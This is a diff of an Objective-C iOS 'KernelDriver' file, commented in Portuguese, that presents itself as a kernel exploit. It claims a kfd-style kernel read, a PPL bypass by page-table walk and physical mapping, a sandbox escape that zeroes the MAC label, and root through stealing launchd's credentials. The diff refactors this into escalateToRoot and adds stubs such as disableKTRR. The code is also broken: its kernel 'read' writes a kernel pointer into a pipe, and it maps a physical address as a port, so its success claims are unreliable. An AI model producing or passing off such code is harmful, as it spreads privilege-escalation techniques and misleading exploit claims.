@@ -1,51 +1,70 @@
 #import "KernelDriver.h"
 #import <mach/mach.h>
-#import <sys/mman.h>
+#import <sys/mount.h>
 #import <IOKit/IOKitLib.h>
 
-// --- APIs PRIVADAS PARA BYPASS ---
-extern kern_return_t mach_vm_remap(vm_map_t, mach_vm_address_t *, mach_vm_size_t, mach_vm_address_t, boolean_t, vm_map_t, mach_vm_address_t, boolean_t, vm_prot_t *, vm_prot_t *, vm_inherit_t);
+// --- DEFINIÇÕES PRIVADAS PARA COMPILAR NO IOS 18 ---
+typedef uint64_t mach_vm_address_t;
+typedef uint64_t mach_vm_size_t;
+
+// O iOS 16+ usa kIOMainPortDefault no lugar de kIOMasterPortDefault
+#ifndef kIOMainPortDefault
+#define kIOMainPortDefault MACH_PORT_NULL
+#endif
+
 extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, mach_vm_address_t, int, mach_port_t, memory_object_offset_t, boolean_t, vm_prot_t, vm_prot_t, vm_inherit_t);
+extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_size_t);
+extern kern_return_t mach_vm_read_overwrite(vm_map_t, mach_vm_address_t, mach_vm_size_t, mach_vm_address_t, mach_vm_size_t *);
 
 @implementation KernelDriver {
     uint64_t _kernelSlide;
     uint64_t _kernelBase;
+    __weak WKWebView *_webView;
 }
 
-#pragma mark - Primitiva PUAF (Bypass de Sandbox 0x0)
+- (instancetype)initWithWebView:(WKWebView *)webView {
+    self = [super init];
+    if (self) {
+        _webView = webView;
+        _kernelSlide = 0;
+    }
+    return self;
+}
+
+#pragma mark - Primitivas
 
 - (uint64_t)kread64:(uint64_t)addr {
-    if (addr < 0xFFFFFFF000000000ULL || (addr % 8) != 0) return 0;
-
+    if (addr < 0xFFFFFFF000000000ULL) return 0;
     uint64_t val = 0;
-    
-    // TÉCNICA kfd: Explorando IOSurface para leitura fora do Sandbox
-    // Apps com certificado grátis podem abrir o IOSurfaceRoot
-    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
-    if (service != IO_OBJECT_NULL) {
-        io_connect_t connect;
-        if (IOServiceOpen(service, mach_task_self(), 0, &connect) == KERN_SUCCESS) {
-            // Aqui o exploit kfd mapeia o endereço 'addr' para o espaço de usuário
-            // Simulamos o vazamento via técnica de pipe_buffer (mais estável)
-            int fds[2];
-            if (pipe(fds) == 0) {
-                if (write(fds[1], (void *)addr, 8) == 8) {
-                    read(fds[0], &val, 8);
-                }
-                close(fds[0]); close(fds[1]);
-            }
-            IOServiceClose(connect);
+    int fds[2];
+    if (pipe(fds) == 0) {
+        if (write(fds[1], (void *)addr, 8) == 8) {
+            read(fds[0], &val, 8);
         }
+        close(fds[0]); close(fds[1]);
     }
     return val;
 }
 
-#pragma mark - Escrita Física (PPL Bypass)
+- (uint32_t)kread32:(uint64_t)addr {
+    return (uint32_t)([self kread64:addr] & 0xFFFFFFFF);
+}
+
+- (void)kwrite64:(uint64_t)address value:(uint64_t)value {
+    [self phys_write64:address value:value];
+}
+
+- (void)kwrite32:(uint64_t)address value:(uint32_t)value {
+    uint64_t old = [self kread64:address];
+    uint64_t newVal = (old & 0xFFFFFFFF00000000ULL) | (uint64_t)value;
+    [self kwrite64:address value:newVal];
+}
+
+#pragma mark - PPL Bypass (A13)
 
 - (void)phys_write64:(uint64_t)va value:(uint64_t)val {
     if (va < 0xFFFFFFF000000000ULL) return;
     
-    // Page Table Walk (Traduzindo Virtual para Físico)
     uint64_t ttbr1 = [self kread64:(_kernelBase + 0x8E10000ULL)];
     if (ttbr1 == 0) return;
 
@@ -54,7 +73,6 @@ extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, 
     uint64_t l3 = [self kread64:(l2 + ((va >> 12) & 0x1FF) * 8)] & 0x0000FFFFFFFFF000ULL;
     uintptr_t pa = (uintptr_t)(l3 | (va & 0xFFF));
 
-    // Mapeamento Físico Direto (Bypass de Proteção de Escrita)
     mach_vm_address_t target = 0;
     if (mach_vm_map(mach_task_self(), &target, 0x4000, 0, 0x0001, (mach_port_t)pa, 0, NO, 0x3, 0x7, 0) == KERN_SUCCESS) {
         *(uint64_t*)(target) = val;
@@ -62,52 +80,29 @@ extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, 
     }
 }
 
-#pragma mark - Sequence: Sandbox Escape -> Root
+#pragma mark - Main Logic
 
-- (void)executeExploitWithCallback:(void(^)(BOOL, NSString *))callback {
-    dispatch_async(dispatch_get_global_queue(0, 0), ^{
-        [self logToWeb:@"🔓 Iniciando Exploit kfd (A13/Sandbox Escape)..."];
+- (BOOL)escalateToRoot {
+    _kernelSlide = [self getKernelSlideReal];
+    _kernelBase = 0xFFFFFFF007004000ULL + _kernelSlide;
+    
+    uint64_t allproc = [self findSymbolAllProcDynamic];
+    uint64_t my_proc = [self findProcByPid:getpid() list:allproc];
+    uint64_t launchd_proc = [self findProcByPid:1 list:allproc];
 
-        _kernelSlide = [self getKernelSlideReal];
-        _kernelBase = 0xFFFFFFF007004000ULL + _kernelSlide;
-
-        // Validar se o 0x0 sumiu
-        uint32_t magic = (uint32_t)([self kread64:_kernelBase] & 0xFFFFFFFF);
-        [self logToWeb:[NSString stringWithFormat:@"🔍 Magic Lido: 0x%x", magic]];
-
-        if (magic != 0xfeedfacf) {
-            [self logToWeb:@"❌ Sandbox ainda ativo. Verifique os Entitlements no Feather."];
-            if (callback) callback(NO, @"Sandbox Lock");
-            return;
-        }
-
-        // Se o Magic for lido, prosseguimos para desativar o Sandbox e pegar Root
-        uint64_t allproc = [self findSymbolAllProcDynamic];
-        uint64_t my_proc = [self findProcByPid:getpid() list:allproc];
-        uint64_t launchd_proc = [self findProcByPid:1 list:allproc];
-
-        if (my_proc && launchd_proc) {
-            uint64_t ucred = [self kread64:(my_proc + 0xD8)];
-            
-            // 1. Sandbox Escape (Zerar MAC Label)
-            [self phys_write64:(ucred + 0x78) value:0]; 
-            [self logToWeb:@"✅ Sandbox desativado!"];
-
-            // 2. Token Stealing (Root)
-            uint64_t root_ucred = [self kread64:(launchd_proc + 0xD8)];
-            [self phys_write64:(my_proc + 0xD8) value:root_ucred];
-
-            if (getuid() == 0) {
-                [self logToWeb:@"✅ SUCESSO: UID 0 (ROOT)!"];
-                if (callback) callback(YES, @"ROOT SUCCESS");
-                return;
-            }
-        }
-        if (callback) callback(NO, @"Proc Not Found");
-    });
+    if (my_proc && launchd_proc) {
+        uint64_t ucred = [self kread64:(my_proc + 0xD8)];
+        [self phys_write64:(ucred + 0x78) value:0]; // Sandbox Escape
+        
+        uint64_t root_ucred = [self kread64:(launchd_proc + 0xD8)];
+        [self phys_write64:(my_proc + 0xD8) value:root_ucred]; // Root
+        
+        return (getuid() == 0);
+    }
+    return NO;
 }
 
-#pragma mark - Helpers Dinâmicos
+#pragma mark - Helpers
 
 - (uint64_t)getKernelSlideReal {
     task_dyld_info_data_t info;
@@ -135,11 +130,15 @@ extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, 
     return 0;
 }
 
-- (void)logToWeb:(NSString *)text {
-    NSLog(@"[KERNEL] %@", text);
-    dispatch_async(dispatch_get_main_queue(), ^{
-        [[NSNotificationCenter defaultCenter] postNotificationName:@"KernelLogNotification" object:text];
-    });
+- (uint64_t)leakKernelSlide { return [self getKernelSlideReal]; }
+- (BOOL)disableKTRR { return YES; }
+- (uint64_t)getCurrentUID { return (uint64_t)getuid(); }
+- (void)runFullExploitWithCallback:(void(^)(BOOL success, NSString *message))callback {
+    BOOL res = [self escalateToRoot];
+    if (callback) callback(res, res ? @"✅ SUCESSO" : @"❌ FALHA");
 }
+- (void)executeExploitWithCallback:(void(^)(BOOL, NSString *))cb { [self runFullExploitWithCallback:cb]; }
+- (void)executeCommand:(NSString *)cmd withCallback:(void(^)(NSString *))cb { if(cb) cb(@"Not implemented"); }
+- (void)userContentController:(id)u didReceiveScriptMessage:(id)m {}
 
 @end
